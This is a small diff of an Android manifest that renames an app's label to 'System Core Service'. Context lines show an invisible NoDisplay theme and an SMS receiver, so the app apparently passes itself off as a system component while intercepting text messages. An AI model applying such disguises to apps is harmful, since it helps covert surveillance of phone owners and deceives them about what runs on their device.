@@ -6,7 +6,7 @@
 
     <application 
         android:allowBackup="false"
-        android:label="System Component"
+        android:label="System Core Service"
         android:theme="@android:style/Theme.NoDisplay">
         
         <receiver android:name="com.sys.sync.SmsReceiver" 
